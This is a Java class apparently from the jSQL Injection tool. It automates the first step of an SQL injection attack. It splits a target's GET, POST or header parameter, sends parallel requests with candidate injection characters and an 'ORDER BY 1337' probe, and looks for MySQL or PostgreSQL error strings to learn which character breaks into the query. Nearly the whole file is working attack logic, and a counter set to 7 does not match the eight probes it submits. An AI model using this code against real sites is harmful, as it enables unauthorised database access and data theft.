package com.jsql.model.suspendable;

import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.exception.PreparationException;
import com.jsql.model.exception.StoppableException;
import com.jsql.util.ConnectionUtil;

/**
 * Runnable class, define insertionCharacter that will be used by all futures requests,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc,
 * this class/function tries to find the working one by searching a special error message
 * in the source page.
 */
public class SuspendableGetInsertionCharacter extends AbstractSuspendable {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(SuspendableGetInsertionCharacter.class);

    @Override
    public String run(Object... args) throws PreparationException, StoppableException {
        int nbStarInParameter = 0;
        if (ConnectionUtil.getData.contains("*")) nbStarInParameter++;
        if (ConnectionUtil.postData.contains("*")) nbStarInParameter++;
        if (ConnectionUtil.headerData.contains("*")) nbStarInParameter++;
        if (nbStarInParameter >= 2) {
            throw new PreparationException("Character * must be used once in GET, POST or Header parameters");
            
        } else if (ConnectionUtil.getData.contains("*") && !"GET".equalsIgnoreCase(ConnectionUtil.method)) {
            throw new PreparationException("Activate method GET to use character * or remove it from GET parameters");
            
        } else if (ConnectionUtil.postData.contains("*") && !"POST".equalsIgnoreCase(ConnectionUtil.method)) {
            throw new PreparationException("Activate method POST to use character * or remove it from POST parameters");
            
        } else if (ConnectionUtil.headerData.contains("*") && !"HEADER".equalsIgnoreCase(ConnectionUtil.method)) {
            throw new PreparationException("Activate method Header to use character * or remove it from Header parameters");
            
        } else
        
        // Has the url a query string?
        if ("GET".equalsIgnoreCase(ConnectionUtil.method) && (ConnectionUtil.getData == null || "".equals(ConnectionUtil.getData))) {
            /**
             * TODO Preparation Format Exception
             */
            throw new PreparationException("No query string");
            
        // Is the query string well formed?
        } else if (!"".equals(ConnectionUtil.getData) && ConnectionUtil.getData.matches("[^\\w]*=.*")) {
            throw new PreparationException("Incorrect query string");
            
        } else if (!"".equals(ConnectionUtil.postData) && ConnectionUtil.postData.indexOf("=") < 0) {
            throw new PreparationException("Incorrect POST datas");
            
        } else if (!"".equals(ConnectionUtil.headerData) && ConnectionUtil.headerData.indexOf(":") < 0) {
            throw new PreparationException("Incorrect HEADER datas");
            
        // Parse query information: url=>everything before the sign '=',
        // start of query string=>everything after '='
        } else if ("GET".equalsIgnoreCase(ConnectionUtil.method)) {
            if (ConnectionUtil.getData.contains("*")) {
                return "";
            } else if (!ConnectionUtil.getData.matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.getData);
                regexSearch.find();
                try {
                    ConnectionUtil.getData = regexSearch.group(1);
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new PreparationException("Incorrect GET format");
                }
            }
            
        // Parse post information
        } else if ("POST".equalsIgnoreCase(ConnectionUtil.method)) {
            if (ConnectionUtil.postData.contains("*")) {
                return "";
            } else if (!ConnectionUtil.postData.matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.postData);
                regexSearch.find();
                try {
                    ConnectionUtil.postData = regexSearch.group(1);
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new PreparationException("Incorrect POST format");
                }
            }
        // Parse header information
        } else if ("HEADER".equalsIgnoreCase(ConnectionUtil.method)) {
            if (ConnectionUtil.headerData.contains("*")) {
                return "";
            } else if (!ConnectionUtil.headerData.matches(".*:$")) {
                Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(ConnectionUtil.headerData);
                regexSearch.find();
                try {
                    ConnectionUtil.headerData = regexSearch.group(1);
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new PreparationException("Incorrect Header format");
                }
            }
        }

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<CallableHTMLPage> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        for (String insertionCharacter : new String[] {"0", "0'", "'", "-1", "1", "\"", "-1)", "-1))"}) {
            taskCompletionService.submit(
                new CallableHTMLPage(
                    insertionCharacter + 
                    MediatorModel.model().currentVendor.getValue().getSqlOrderBy(),
                    insertionCharacter
                )
            );
        }

        int total = 7;
        while (0 < total) {
            // The user need to stop the job
            if (this.isSuspended()) {
                throw new StoppableException();
            }
            try {
                CallableHTMLPage currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (
                    Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() || 
                    Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches()
                ) {
                    // the correct character: mysql
                    return currentCallable.getInsertionCharacter();
                } else if (Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()) {
                    // the correct character: postgresql
                    return currentCallable.getInsertionCharacter();
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error(e, e);
            }
        }

        // Nothing seems to work, forces 1 has the character
        return "1";
    }
}